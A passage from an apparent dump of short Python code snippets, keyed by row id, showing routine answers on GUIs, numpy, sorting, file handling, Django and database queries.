</snippet></ROW><ROW><id>11967467</id><snippet>import os
import time

def checkfile(filename):
    filestats = os.stat(filename) # Gets infromation on file.
    if time.time() - filestats.st_mtime &gt; 120: # Compares if file modification date is more than 120 less than the current time.
        os.remove(filename) # Removes file if it needs to be removed.

path = '/path/to/folder'

dirList = os.listdir(path) # Lists specified directory.
for filename in dirList:
    checkfile(os.path.join(path, filename)) # Runs checkfile function.
</snippet></ROW><ROW><id>11967469</id><snippet>def editTags(self, event):  # wxGlade: MyFrame.&lt;event_handler&gt;
    samples={
          "Face1":"(100,100)", \
          "Face2":"(50,40)", \
          "Car":"(500,230)", \
          "Wallclock":"(120,230)"

        }

    self.f3.okButton = wx.Button(self.f3, label="OK")
    self.f3.okButton.Bind(wx.EVT_BUTTON, self.onOK)
    self.f3.okButton.SetPosition((40,200))
</snippet></ROW><ROW><id>11967469</id><snippet>    self.f3.new_controls = {}

    spacer=0
</snippet></ROW><ROW><id>11967469</id><snippet>    for k, v in sorted(samples.iteritems()):
        print "K: ", k

        spacer=spacer+40
        print "V: ", v
        print
</snippet></ROW><ROW><id>11967469</id><snippet>new_TextControl</snippet></ROW><ROW><id>11967469</id><snippet>v</snippet></ROW><ROW><id>11967469</id><snippet>for</snippet></ROW><ROW><id>11967469</id><snippet>self.f3.new_controls</snippet></ROW><ROW><id>11967469</id><snippet>dict)</snippet></ROW><ROW><id>11967469</id><snippet>        # Dict will hold {'Car': wx.TextCtrl(...), 'Wallclock': ...}
        self.f3.new_controls[k] = wx.TextCtrl(self.f3, -1, value=k)
        self.f3.new_controls[k].SetPosition((40,spacer))
</snippet></ROW><ROW><id>11967469</id><snippet>    self.f3.Show()
</snippet></ROW><ROW><id>11967469</id><snippet>new_controls</snippet></ROW><ROW><id>11967469</id><snippet>self.f3.new_controls['Car'].GetValue()  # Receive input from 'Car' text control.
</snippet></ROW><ROW><id>11967760</id><snippet>make_archive</snippet></ROW><ROW><id>11967760</id><snippet>make_archive</snippet></ROW><ROW><id>11967760</id><snippet>f.write</snippet></ROW><ROW><id>11967760</id><snippet>f.write(make_archive(f.name, 'zip', root_dir))
f.seek(0)
data = f.read()
</snippet></ROW><ROW><id>11967760</id><snippet>delete=False</snippet></ROW><ROW><id>11967760</id><snippet>import os
f.close()
os.unlink(f.name)
</snippet></ROW><ROW><id>11967760</id><snippet>delete</snippet></ROW><ROW><id>11967760</id><snippet>data = open(make_archive(f.name, 'zip', root_dir), 'rb').read()
</snippet></ROW><ROW><id>11967760</id><snippet>NamedTemporaryFile</snippet></ROW><ROW><id>11967760</id><snippet>tempfile.mkdtemp()</snippet></ROW><ROW><id>11967760</id><snippet>tmpdir = tempfile.mkdtemp()
try:
    tmparchive = os.path.join(tmpdir, 'archive')

    root_dir = "something"

    data = open(make_archive(tmparchive, 'zip', root_dir), 'rb').read()

finally:
    shutil.rmtree(tmpdir)
</snippet></ROW><ROW><id>11968006</id><snippet>&gt;&gt;&gt; Number_of_lists=3 
&gt;&gt;&gt; My_list={}
&gt;&gt;&gt; for j in range(1,Number_of_lists+1):
      My_list[j]=(j,j,j)
&gt;&gt;&gt; All_my_lists=[My_list[x] for x in My_list]

&gt;&gt;&gt; print(All_my_lists)
[(1, 1, 1), (2, 2, 2), (3, 3, 3)]
</snippet></ROW><ROW><id>11968006</id><snippet>All_my_lists=[My_list[x] for x in My_list]</snippet></ROW><ROW><id>11968006</id><snippet>All_my_lists=[]
for key in My_list:
   All_my_lists.append(My_list[key])
</snippet></ROW><ROW><id>11968093</id><snippet>x = x[y != 0]
y = y[y != 0]
</snippet></ROW><ROW><id>11968093</id><snippet>import numpy as np
x = np.array([[11, 12, 13], [21, 22, 23], [31, 32, 33]])
y = np.array([1, 0, 3])
x = x[y != 0]
y = y[y != 0]
</snippet></ROW><ROW><id>11968093</id><snippet>x == array([[11, 12, 13],
            [31, 32, 33]])
y == array([1, 3])
</snippet></ROW><ROW><id>11968211</id><snippet>[Vec2d(200.0, 400.0), Vec2d(400.0, 400.0), Vec2d(400.0, 200.0), Vec2d(200.0, 200.0)]
</snippet></ROW><ROW><id>11968237</id><snippet>$addToSet</snippet></ROW><ROW><id>11968237</id><snippet>$push</snippet></ROW><ROW><id>11968237</id><snippet>$set</snippet></ROW><ROW><id>11968237</id><snippet>field.subfield</snippet></ROW><ROW><id>11968237</id><snippet>my_record.update({
    match_criteria
}, {
    '$set': {
        'collaborators.id2': {
            // new document fields here
        }
    }
})
</snippet></ROW><ROW><id>11968253</id><snippet>javascript_resources</snippet></ROW><ROW><id>11968253</id><snippet>__init__</snippet></ROW><ROW><id>11968438</id><snippet>enumerate()</snippet></ROW><ROW><id>11968438</id><snippet>[CountObject(amount=a, type=i) for i, a in enumerate(counts)]
</snippet></ROW><ROW><id>11968438</id><snippet>i</snippet></ROW><ROW><id>11968756</id><snippet>import sys
if sys.flags.interactive:
    print 'I am in interactive mode!'
else:
    print 'I am in batch mode!'
</snippet></ROW><ROW><id>11968759</id><snippet>itertools.count</snippet></ROW><ROW><id>11968759</id><snippet>for i, x, y in zip(count(), "1234", "ABCD"):
    # do stuff
</snippet></ROW><ROW><id>11968818</id><snippet>Thread</snippet></ROW><ROW><id>11968818</id><snippet>t1 = Thread(target=call_script, args=(scriptA + argumentsA))
t2 = Thread(target=call_script, args=(scriptA + argumentsB))
t3 = Thread(target=call_script, args=(scriptA + argumentsC))

t1.start()
t2.start()
t3.start()

t1.join()
t2.join()
t3.join()
</snippet></ROW><ROW><id>11968818</id><snippet>t1</snippet></ROW><ROW><id>11968818</id><snippet>t2</snippet></ROW><ROW><id>11968818</id><snippet>t3</snippet></ROW><ROW><id>11968824</id><snippet>a = [1, 2]
b = [100, 200]
c = [1000, 2000]

import itertools
for p in itertools.product(a, b, c):
    print p
</snippet></ROW><ROW><id>11968824</id><snippet>(1, 100, 1000)
(1, 100, 2000)
(1, 200, 1000)
(1, 200, 2000)
(2, 100, 1000)
(2, 100, 2000)
(2, 200, 1000)
(2, 200, 2000)
</snippet></ROW><ROW><id>11968848</id><snippet>abs</snippet></ROW><ROW><id>11968848</id><snippet>map(abs, entry[1][0]) 
map(abs, entry[1][1]) 
</snippet></ROW><ROW><id>11968848</id><snippet>zip(map(abs, entry[1][0]), map(abs, entry[1][1]))
</snippet></ROW><ROW><id>11968848</id><snippet>map(max, zip(map(abs, entry[1][0]), map(abs, entry[1][1])))
</snippet></ROW><ROW><id>11968848</id><snippet>with open("out1.csv", "wb") as fp: 
   writer = csv.writer(fp, delimiter=",")     
   for entry in large:        
       writer.writerow([entry[0]])         
       for line in entry[1]:             
           writer.writerow(line)        
       writer.writerow([])
       writer.writerow(['Sorted absolute maxes'])
       maxima = map(max, zip(map(abs, entry[1][0]), map(abs, entry[1][1])) )
       writer.writerow(sorted(maxima, reverse=True))
       writer.writerow([])
</snippet></ROW><ROW><id>11968848</id><snippet>5501
4,5,8
6,-4,-6

Sorted absolute maxes
8,6,5

2222
2,4,-5
1,-15,4

Sorted absolute maxes
15,5,2
</snippet></ROW><ROW><id>11969014</id><snippet>os.listdir</snippet></ROW><ROW><id>11969014</id><snippet>os.path.isfile</snippet></ROW><ROW><id>11969014</id><snippet>os.walk</snippet></ROW><ROW><id>11969014</id><snippet>files = [f for f in os.listdir('.') if os.path.isfile(f)]
for f in files:
    # do something
</snippet></ROW><ROW><id>11969033</id><snippet>libjpeg</snippet></ROW><ROW><id>11969034</id><snippet>elements = []
numberOfPrompts = raw_input("Enter total amount of elements: ")
for i in range(numberOfPrompts):
   # will prompt "Enter Element 1: " on the first iteration
   userInput = raw_input("Enter Element %s" % (i+1, )) 
   elements.append(userInput)
</snippet></ROW><ROW><id>11969034</id><snippet>&gt;&gt;&gt; Enter total amount of elements: 2 # now hit enter
</snippet></ROW><ROW><id>11969034</id><snippet>numberOfPrompts</snippet></ROW><ROW><id>11969034</id><snippet>2</snippet></ROW><ROW><id>11969034</id><snippet>elements</snippet></ROW><ROW><id>11969034</id><snippet>[]</snippet></ROW><ROW><id>11969034</id><snippet>&gt;&gt;&gt; Enter Element 1: 3.1415 # hit enter
</snippet></ROW><ROW><id>11969034</id><snippet>numberOfPrompts</snippet></ROW><ROW><id>11969034</id><snippet>2</snippet></ROW><ROW><id>11969034</id><snippet>elements</snippet></ROW><ROW><id>11969034</id><snippet>['3.1415']</snippet></ROW><ROW><id>11969034</id><snippet>&gt;&gt;&gt; Enter Element 2: 2.7182
</snippet></ROW><ROW><id>11969034</id><snippet>elements</snippet></ROW><ROW><id>11969034</id><snippet>['3.1415', '2.7182']</snippet></ROW><ROW><id>11969034</id><snippet>elements</snippet></ROW><ROW><id>11969034</id><snippet>&gt;&gt;&gt; elements[1]
2.7182
</snippet></ROW><ROW><id>11969034</id><snippet>elements = {}
numberOfPrompts = raw_input("Enter total amount of elements: ")
for i in range(numberOfPrompts):
   # will prompt "Enter Element 1: " on the first iteration
   userInput = raw_input("Enter Element %s" % (i+1, )) 
   userInput = userInput.lower()
   elements[userInput] = float(elem_data.get(userInput))
</snippet></ROW><ROW><id>11969034</id><snippet>elements</snippet></ROW><ROW><id>11969034</id><snippet>{'oxygen':15.9994, 'hydrogen':1.0079}
</snippet></ROW><ROW><id>11969034</id><snippet>for element in elements.keys():
    print element
# output:
oxygen
hydrogen
</snippet></ROW><ROW><id>11969034</id><snippet>weightSum = 0
for weight in elements.values():
    weightSum += weight
print weightSum
# output:
17,0073
</snippet></ROW><ROW><id>11969158</id><snippet>close_all</snippet></ROW><ROW><id>11969158</id><snippet>serve_forever</snippet></ROW><ROW><id>11969158</id><snippet>ftpd</snippet></ROW><ROW><id>11969158</id><snippet>main</snippet></ROW><ROW><id>11969158</id><snippet>close</snippet></ROW><ROW><id>11969158</id><snippet>close_all</snippet></ROW><ROW><id>11969158</id><snippet>ftpd = ftpserver.FTPServer(address, handler)</snippet></ROW><ROW><id>11969158</id><snippet>ftpd.close_all()</snippet></ROW><ROW><id>11969307</id><snippet>notify-osd</snippet></ROW><ROW><id>11969474</id><snippet>bad_words = ['bad', 'naughty']

with open('oldfile.txt') as oldfile, open('newfile.txt', 'w') as newfile:
    for line in oldfile:
        if not any(bad_word in line for bad_word in bad_words):
            newfile.write(line)
</snippet></ROW><ROW><id>11969569</id><snippet>intervals = [[30, "slow"], [60, "intense"], [30, "slow"], [60, "intense]]
</snippet></ROW><ROW><id>11969569</id><snippet>after</snippet></ROW><ROW><id>11969569</id><snippet>after</snippet></ROW><ROW><id>11969569</id><snippet>import Tkinter as tk

class ExampleApp(tk.Tk):
    def __init__(self):
        tk.Tk.__init__(self)
        self.label = tk.Label(self, text="", width=10, font= ("Helvetica",72), background='yellow', fg = 'red')
        self.label2 = tk.Label(self, text="", width=10, font=("Helvetica",72), background='yellow', fg = 'blue')
        self.label.pack()
        self.label2.pack()
        self.intervals = [[30, "Slow"], [60, "Exercise 1"],
                          [30, "Slow"], [60, "Exercise 2"],
                          [30, "Slow"], [60, "Exercise 3"],
                          [30, "Slow"], [60, "Exercise 4"],
                          ]
        self.countdown()

    def countdown(self):
        (remaining, label) = self.intervals[0]
        self.label.configure(text=remaining)
        self.label2.configure(text=label)
        remaining -= 1
        if remaining &lt; 0:
            self.intervals.pop(0)
        else:
            self.intervals[0][0] = remaining
        if len(self.intervals) &gt; 0:
            self.after(1000, self.countdown)
        else:
            self.label.configure(text="Done!")

if __name__ == "__main__":
    app = ExampleApp()
    app.title("Intense Workout")
    app.geometry('550x550+200+200')
    app.configure(background='yellow')
    app.mainloop()
</snippet></ROW><ROW><id>11969589</id><snippet>python -tt</snippet></ROW><ROW><id>11969691</id><snippet>&lt;form action="" method="POST"&gt;
{{ form.as_p }}
&lt;input type="submit" value="{% trans "Add " %}" /&gt; 
&lt;/form&gt;
&lt;script&gt;
$(document).ready(function(){
    $('#id_timestamp').timepicker();
});
&lt;/script&gt;
</snippet></ROW><ROW><id>11969760</id><snippet>key</snippet></ROW><ROW><id>11969760</id><snippet>import operator
lst.sort(key=lambda x: x.blocks)
lst.sort(key=operator.attrgetter('blocks') ) #alternative without lambda.
</snippet></ROW><ROW><id>11969760</id><snippet>stats</snippet></ROW><ROW><id>11969760</id><snippet>__eq__</snippet></ROW><ROW><id>11969760</id><snippet>__gt__</snippet></ROW><ROW><id>11969760</id><snippet>__lt__</snippet></ROW><ROW><id>11969760</id><snippet>import functools
@functools.total_ordering
class stats(object): #inherit from object.  It's a good idea
    def __init__(self, fname, blocks, backEdges):
        self.fname = fname
        self.blocks = blocks
        self.backEdges = backEdges
    def printStats(self):
        print self.fname + str(self.blocks) + str(self.backEdges)
    def __eq__(self,other):
         return self.blocks == other.blocks
    def __lt__(self,other):
         return self.blocks &lt; other.blocks
</snippet></ROW><ROW><id>11969760</id><snippet>stats</snippet></ROW><ROW><id>11969760</id><snippet>lst.sort()  #or if you want a new list:  new_lst = sorted(lst)
</snippet></ROW><ROW><id>11970283</id><snippet>with open(myLargeFile) as f:
   with open(myOtherLargeFile, "w") as fo:
   for line in f:            
      fo.write(line)
</snippet></ROW><ROW><id>11970356</id><snippet>UserCreationForm</snippet></ROW><ROW><id>11970356</id><snippet>UserChangeForm</snippet></ROW><ROW><id>11970356</id><snippet>username = forms.RegexField(
        label=_("Username"), max_length=30, regex=r"^[\w.@+-]+$",
        help_text = _("Required. 30 characters or fewer. Letters, digits and "
                      "@/./+/-/_ only."),
        error_messages = {
            'invalid': _("This value may contain only letters, numbers and "
                         "@/./+/-/_ characters.")})
</snippet></ROW><ROW><id>11970583</id><snippet>operator.itemgetter</snippet></ROW><ROW><id>11970583</id><snippet>sorted(teamlist, key=operator.itemgetter('rating'))
</snippet></ROW><ROW><id>11970710</id><snippet>id==dummy</snippet></ROW><ROW><id>11970710</id><snippet>def max_at_ids(x, id, ids):
    # create a 1D view of x and id:
    r_x = x.ravel()
    r_id = id.ravel()
    sorter = np.argsort(r_id)

    # create new sorted arrays:
    r_id = r_id[sorter]; r_x = r_x[sorter]

    # unfortunatly there is no reduce functionality for np.max...

    ids = np.unique(ids) # create a sorted, unique copy, just in case

    # w gives the places where the sorted arrays id changes:
    w = np.where(r_id[:-1] != r_id[1:])[0] + 1
</snippet></ROW><ROW><id>11970710</id><snippet>    # The result array:
    max_x = np.empty(len(ids), dtype=r_x.dtype)
    start_idx = 0; end_idx = w[0]
    i_ids = 0
    i_w = 0

    while i_ids &lt; len(ids) and i_w &lt; len(w) + 1:
        if ids[i_ids] == r_id[start_idx]:
            max_x[i_ids] = r_x[start_idx:end_idx].max()
            i_ids += 1
            i_w += 1
        elif ids[i_ids] &gt; r_id[start_idx]:
            i_w += 1
        else:
            i_ids += 1
            continue # skip updating start_idx/end_idx

        start_idx = end_idx
        # Set it to None for the last slice (might be faster to do differently)
        end_idx = w[i_w] if i_w &lt; len(w) else None

    return ids, max_x
</snippet></ROW><ROW><id>11970710</id><snippet>np.fmax.reduceat</snippet></ROW><ROW><id>11970710</id><snippet># just to 0 at the start of w
# (or calculate first slice by hand and use out=... keyword argument to avoid even
# this copy.
w = np.concatenate(([0], w))
max_x = np.fmin.reduceat(r_x, w)
return ids, max_x
</snippet></ROW><ROW><id>11970967</id><snippet>type</snippet></ROW><ROW><id>11970967</id><snippet>type(class)</snippet></ROW><ROW><id>11970967</id><snippet>class.__class__</snippet></ROW><ROW><id>11971139</id><snippet>self.results = self.results.append(...)
</snippet></ROW><ROW><id>11971139</id><snippet>self.results</snippet></ROW><ROW><id>11971139</id><snippet>self.results</snippet></ROW><ROW><id>11971353</id><snippet>mod_wsgi</snippet></ROW><ROW><id>11971353</id><snippet>SetEnv</snippet></ROW><ROW><id>11971353</id><snippet>mod_wsgi</snippet></ROW><ROW><id>11971353</id><snippet>SetEnv</snippet></ROW><ROW><id>11971353</id><snippet>os.environ</snippet></ROW><ROW><id>11971353</id><snippet>def application(environ, start_response):
    os.environ['ssl_client_s_dn'] = environ['ssl_client_s_dn']
    return _application(environ, start_response)
</snippet></ROW><ROW><id>11971353</id><snippet>os.environ</snippet></ROW><ROW><id>11971357</id><snippet>is</snippet></ROW><ROW><id>11971357</id><snippet>in</snippet></ROW><ROW><id>11971357</id><snippet>any</snippet></ROW><ROW><id>11971357</id><snippet>is</snippet></ROW><ROW><id>11971357</id><snippet># For sequences
any(y is item for item in container)

# For sets, short circuit first for the not-present case:
# (note that you normally should not need this as you are supposed to rely on the hash)
y in setcontainer and any(y is item for item in setcontainer)

# For mappings, y is a key
y in mapping 

# For mappings, y is a value, and you do not have a key, fall back to any
any(y is item for item in mapping.itervalues())
</snippet></ROW><ROW><id>11971471</id><snippet>&gt;&gt;&gt; firstdict = {"somelist":[]}
&gt;&gt;&gt; seconddict = {"attribute1": "value1", "attribute2": "value2"}
&gt;&gt;&gt; firstdict["somelist"].append(seconddict)
&gt;&gt;&gt; print firstdict["somelist"][0]['attribute1']
value1
</snippet></ROW><ROW><id>11971542</id><snippet>print</snippet></ROW><ROW><id>11971542</id><snippet>cursor = db.model.find({'time': {'$gte': start, '$lt': end}}).sort('time')

for result in cursor:
    print result['_id']
</snippet></ROW><ROW><id>11971542</id><snippet>result['_id']</snippet></ROW><ROW><id>11971542</id><snippet>print</snippet></ROW><ROW><id>11971555</id><snippet>logger = logging.getLogger(__name__)
</snippet></ROW><ROW><id>11971555</id><snippet>logger = logging.getLogger('django')
</snippet></ROW><ROW><id>11971769</id><snippet>re.search</snippet></ROW><ROW><id>11971769</id><snippet>p.group(1)</snippet></ROW><ROW><id>11971777</id><snippet>quad</snippet></ROW><ROW><id>11971777</id><snippet># import V
fn = 'cooltemp.dat'
V = loadtxt(fn,unpack=True,usecols=[1])
# print V

@np.vectorize
def result(x):
    def integrand(E):
        del1, del2, R, fE, fEeV = 1.0,2.0,1.0,1.0,1.0
        e = 1.602176565*10**-19
        a = E/( math.sqrt( E**2 - del1**2 ) )
        b = ( E+ e*x )/( math.sqrt( ( E + e*x )**2) - del2**2)
        c = fE-fEeV
        d = 1/(e*R) # integration constant
        return a * b * c
    return quad(integrand, -inf, inf)

I = result(V)
</snippet></ROW><ROW><id>11971777</id><snippet>result(v)</snippet></ROW><ROW><id>11971777</id><snippet>integrand(E)</snippet></ROW><ROW><id>11971777</id><snippet>@np.vectorize</snippet></ROW><ROW><id>11971777</id><snippet>result</snippet></ROW><ROW><id>11971806</id><snippet>KeyError</snippet></ROW><ROW><id>11971979</id><snippet>import spynner
b = spynner.Browser()
b.show()
b.load('http://vk.com')
b.wk_fill('input[name=email]', 'my@mail.ru')
b.wk_fill('input[name=pass]', 'my_secret_password')
b.click("#quick_login_button")
b.browse() # this way we see wha's going on
</snippet></ROW><ROW><id>11972106</id><snippet>class MyClass:

    def __init__(self):
        self._value = 'Initialize self._value with some value or None'        

    def get_foo(self):
        ...magic to access foo...
        return self._value

    def set_foo(self, value):
        ... magic processing for value ...
        self._value = value

    foo = property(get_foo, set_foo)
</snippet></ROW><ROW><id>11972106</id><snippet>inst = MyClass()
inst.foo = 'Some value'
print inst.foo
</snippet></ROW><ROW><id>11972161</id><snippet>import locale

... 

locale.setlocale(locale.LC_ALL, '&lt;desired local&gt;')
# NOTE: using locale.setlocale(locale.LC_ALL, '') will use the machine's default locale defined in the LANG environment variable.
</snippet></ROW><ROW><id>11972161</id><snippet>Enter your birth date (DD-MM-YYYY) : 15-08-2012
You was born a Mittwoch
</snippet></ROW><ROW><id>11972199</id><snippet>log(0)</snippet></ROW><ROW><id>11972199</id><snippet>NaN</snippet></ROW><ROW><id>11972452</id><snippet>import socket; socket.setdefaulttimeout( SECONDS )</snippet></ROW><ROW><id>11972498</id><snippet>dfgb['bar'].value_counts().unstack().fillna(0.)
</snippet></ROW><ROW><id>11972521</id><snippet>cur.execute("INSERT INTO `table1`(field1) VALUES('"+ conn.escape_string(str(data))+"')")
</snippet></ROW><ROW><id>11972521</id><snippet>conn</snippet></ROW><ROW><id>11972547</id><snippet>selenium.spec</snippet></ROW><ROW><id>11972547</id><snippet>setup.py</snippet></ROW><ROW><id>11972547</id><snippet>selenium-2.20.0.tar.gz</snippet></ROW><ROW><id>11972547</id><snippet>http://pypi.python.org/pypi/selenium/</snippet></ROW><ROW><id>11972547</id><snippet>selenium.spec</snippet></ROW><ROW><id>11972942</id><snippet>Ui_*</snippet></ROW><ROW><id>11972942</id><snippet>object</snippet></ROW><ROW><id>11972942</id><snippet>setupUi()</snippet></ROW><ROW><id>11972942</id><snippet>class main.__init__()</snippet></ROW><ROW><id>11972942</id><snippet>QMainWindow</snippet></ROW><ROW><id>11972942</id><snippet>self</snippet></ROW><ROW><id>11972942</id><snippet>setupUi</snippet></ROW><ROW><id>11972942</id><snippet>Ui_MainWindow</snippet></ROW><ROW><id>11972942</id><snippet>self.appInfoPage.setupUi</snippet></ROW><ROW><id>11972942</id><snippet>AtrributeError</snippet></ROW><ROW><id>11972942</id><snippet>Ui_appInfoPage</snippet></ROW><ROW><id>11972942</id><snippet>class AppInfoPage(QWidget, Ui_appInfoPage):
    def __init__(self, parent):
        super(QWidget, self).__init__(parent)
        self.setupUi(self)
...

    self.appInfoPage = AppInfoPage(self)
    self.stackedWidget.addWidget(self.appInfoPage)
</snippet></ROW><ROW><id>11972942</id><snippet>QWidget</snippet></ROW><ROW><id>11972942</id><snippet>AppInfoPage</snippet></ROW><ROW><id>11972942</id><snippet>Ui_appInfoPage</snippet></ROW><ROW><id>11973040</id><snippet>for p in product(*lists)</snippet></ROW><ROW><id>11973040</id><snippet>lists</snippet></ROW><ROW><id>11973040</id><snippet>def func(a,b):
    print (a,b)

args=(1,2)
func(*args)
</snippet></ROW><ROW><id>11973040</id><snippet>def func2(*args): #unpacking
   print(args)  #args is a tuple

func2(1,2)  #prints (1, 2)
</snippet></ROW><ROW><id>11973040</id><snippet>args = (1,2,3)
func2(*args) #prints (1, 2, 3)
</snippet></ROW><ROW><id>11973128</id><snippet>"build_systems":
[
    {
    "name": "Run Tests",
    "cmd": ["source", "/path/to/your/virtualenv/bin/activate"],
    "working_dir": "/path/to/to/you/django_project",
    "cmd": ["python", "manage.py", "test"]
    }
]
</snippet></ROW><ROW><id>11974354</id><snippet>.
|-- pykaboo_django
    |-- core
        # etc.
    |-- manage.py
    # etc
|-- requirements.txt
</snippet></ROW><ROW><id>11974354</id><snippet>from core.models import *
</snippet></ROW><ROW><id>11974399</id><snippet>{% if not loop.last %}
    ,
{% endif %}
</snippet></ROW><ROW><id>11974449</id><snippet>main</snippet></ROW><ROW><id>11974449</id><snippet>install</snippet></ROW><ROW><id>11974449</id><snippet>start -&gt; scripts.main -&gt; scripts.install
              ^                |
              |                |
               ----------------
</snippet></ROW><ROW><id>11974449</id><snippet>main</snippet></ROW><ROW><id>11974449</id><snippet>scripts</snippet></ROW><ROW><id>11974545</id><snippet>handleHeaderMenu</snippet></ROW><ROW><id>11974545</id><snippet>QLineEdit</snippet></ROW><ROW><id>11974545</id><snippet>action = self.menu.exec_(QtGui.QCursor.pos())
self.connect(self.custom_choice, 
                QtCore.SIGNAL("returnPressed()"),
                self.refreshdata)
</snippet></ROW><ROW><id>11974545</id><snippet>QMenu.exec_()</snippet></ROW><ROW><id>11974545</id><snippet>def handleHeaderMenu(self, pos):
    menu = QtGui.QMenu()
    menu.setStyleSheet("""
        QMenu::item {
            background-color: #264F7D;
            color: white; 
            font-weight:bold;}
    """)
    text = menu.addAction("Choose Server to Monitor:")
    text.setEnabled(False)
    menu.addSeparator()

    actionJuliet = menu.addAction('Juliet')
    actionJulietleft = menu.addAction('JulietLeft')
    actionPong = menu.addAction('Pong')
    actionHulk = menu.addAction('Hulk')

    wac = QtGui.QWidgetAction(menu)
    custom_choice = QtGui.QLineEdit()
    custom_choice.setPlaceholderText("Server")
    wac.setDefaultWidget(custom_choice)
    menu.addAction(wac)

    menu.setActiveAction(wac)
    custom_choice.returnPressed.connect(wac.trigger)

    action = menu.exec_(QtGui.QCursor.pos())
    if action:
        if action == wac:
            self.tx = str(custom_choice.text()).strip()
        else:
            self.tx = str(action.text())

        self.refreshdata()

def refreshdata(self):
    print self.tx
</snippet></ROW><ROW><id>11974545</id><snippet>QLineEdit</snippet></ROW><ROW><id>11974545</id><snippet>def get_data(self):

    table_check = """
        SELECT table_name FROM information_schema.tables 
        WHERE table_schema = %s AND table_name = %s 
        """

    table_name = self.tx
    count = self.model.execute(table_check, (self.theDatabaseName, table_name))
    if not count:
        # warn the user that the table name does not exist
        warn_user_of_bad_table()
        return

    sql = """
        SELECT 
            computer_name, idle_time, files_opened, 
            active_time, session_type, cpu, avg_disk_queue
        FROM %s 
        """ % table_name

    count = self.model.execute(sql)
    if not count:
        warn_database_error()
        return

    results = self.model.fetchall()
    user, idle , files, active, session, cpu, disk = zip(*results)
    self.lista = user
    self.listb = disk
    self.listc = cpu
    self.listd = active
    self.liste = files
    self.listf = session
    self.listg = idle  
    self.mystruct2 = {
        'A' : self.lista, 
        'B' : self.listb, 
        'C' : self.listc,
        'E' : self.liste,
        'D' : self.listd,
        'F' : self.listf,
        'G' : self.listg
    }
</snippet></ROW><ROW><id>11974545</id><snippet>zip</snippet></ROW><ROW><id>11974621</id><snippet>mylist</snippet></ROW><ROW><id>11974621</id><snippet>mylist</snippet></ROW><ROW><id>11974843</id><snippet>def OnPaste(evt):
    pass #do something

pasteID = wx.NewId()
aTable = wx.AcceleratorTable([(wx.ACCEL_CTRL,  ord('V'), pasteID ),])
my_main_frame.SetAcceleratorTable(aTable)
my_main_frame.Bind(wx.EVT_MENU,OnPaste,pasteID )
</snippet></ROW><ROW><id>11974942</id><snippet>except:
    return index()
</snippet></ROW><ROW><id>11974942</id><snippet>from urllib2 import Request, urlopen, URLError
req = Request('http://jfvbhsjdfvbs.com')
try:
    response = urlopen(req)
except URLError, e:
    if hasattr(e, 'reason'):
        print 'We failed to reach a server.'
        print 'Reason: ', e.reason
    elif hasattr(e, 'code'):
        print 'The server couldn\'t fulfill the request.'
        print 'Error code: ', e.code
else:
    print 'URL is good!'
</snippet></ROW><ROW><id>11974942</id><snippet>We failed to reach a server.
Reason:  [Errno 61] Connection refused
</snippet></ROW><ROW><id>11975046</id><snippet>Layers = {'Layer0': Layer0, 'Layer1': Layer1, 'Layer2': Layer2}
</snippet></ROW><ROW><id>11975081</id><snippet>for r in results:
    (okays if success_condition(r) else errors).append(r)
</snippet></ROW><ROW><id>11975081</id><snippet>okays_append = okays.append
errors_append = errors.append

for r in results:
    (okays_append if success_condition(r) else errors_append)(r)
</snippet></ROW><ROW><id>11975140</id><snippet>import glob  # Import any python module
moduleType = type(glob)

onTheFly = moduleType("OnTheFly", "Docstring for this module")
</snippet></ROW><ROW><id>11975220</id><snippet>x = np.zeros(size)
x[index] = 1.0
</snippet></ROW><ROW><id>11975220</id><snippet>&gt;&gt;&gt; t = timeit.Timer('np.array([1.0 if i == index else 0.0 for i in range(size)]
)','import numpy as np;size=10000;index=5123')
&gt;&gt;&gt; t.timeit(10)
0.039461429317952934  #original method
&gt;&gt;&gt; t = timeit.Timer('x=np.zeros(size);x[index]=1.0','import numpy as np;size=10
&gt;&gt;&gt; t.timeit(10)
9.4077963240124518e-05 #zeros method
&gt;&gt;&gt; t = timeit.Timer('x=np.eye(1.0,size,index)','import numpy as np;size=10000;i
&gt;&gt;&gt; t.timeit(10)
0.0001398340635319073 #eye method
</snippet></ROW><ROW><id>11975263</id><snippet>    X = 0
    XX = 0
    XY = 0
    XZ = 0

    Y = 0
    YY = 0
    YZ = 0

    Z = 0

    for j in range(0, len(dTemp)):
        X = X + dTemp[j]
        XX = XX + (dTemp[j] * dTemp[j])
        XY = XY + (dTemp[j] * dTempA[j])
        XZ = XZ + (dTemp[j] * Applied[j])

        Y = Y + dTempA[j]
        YY = YY + (dTempA[j] * dTempA[j])
        YZ = YZ + (dTempA[j] * Applied[j])

        Z = Z + Applied[j]


    lhs = numpy.array([[XX, XY, X], [XY, YY, Y], [X, Y, 1]]) 
    rhs = numpy.array([XZ,  YZ, Z])

    coefficients = numpy.linalg (lhs, rhs)

    a = coefficients[0]
    b = coefficients[1]
    c = coefficients[2]
</snippet></ROW><ROW><id>11975305</id><snippet>c = Tkinter.Canvas(width=100, height=100, highlightthickness=0)
&gt;&gt;&gt; c.winfo_reqwidth()
100
</snippet></ROW><ROW><id>11975305</id><snippet>import pprint
pprint.pprint(c.configure())
{'background': ('background',
                'background',
                'Background',
                'SystemButtonFace',
                'SystemButtonFace'),
 'bd': ('bd', 'borderWidth'),
 'bg': ('bg', 'background'),
 'borderwidth': ('borderwidth', 'borderWidth', 'BorderWidth', '0', '0'),
 'closeenough': ('closeenough', 'closeEnough', 'CloseEnough', '1', '1.0'),
 'confine': ('confine', 'confine', 'Confine', '1', '1'),
 'cursor': ('cursor', 'cursor', 'Cursor', '', ''),
 'height': ('height', 'height', 'Height', '7c', '100'),
 'highlightbackground': ('highlightbackground',
                         'highlightBackground',
                         'HighlightBackground',
                         'SystemButtonFace',
                         'SystemButtonFace'),
 'highlightcolor': ('highlightcolor',
                    'highlightColor',
                    'HighlightColor',
                    'SystemWindowFrame',
                    'SystemWindowFrame'),
 'highlightthickness': ('highlightthickness',
                        'highlightThickness',
                        'HighlightThickness',
                        '2',
                        '0'),
 'insertbackground': ('insertbackground',
                      'insertBackground',
                      'Foreground',
                      'SystemButtonText',
                      'SystemButtonText'),
 'insertborderwidth': ('insertborderwidth',
                       'insertBorderWidth',
                       'BorderWidth',
                       '0',
                       '0'),
 'insertofftime': ('insertofftime', 'insertOffTime', 'OffTime', '300', '300'),
 'insertontime': ('insertontime', 'insertOnTime', 'OnTime', '600', '600'),
 'insertwidth': ('insertwidth', 'insertWidth', 'InsertWidth', '2', '2'),
 'offset': ('offset', 'offset', 'Offset', '0,0', '0,0'),
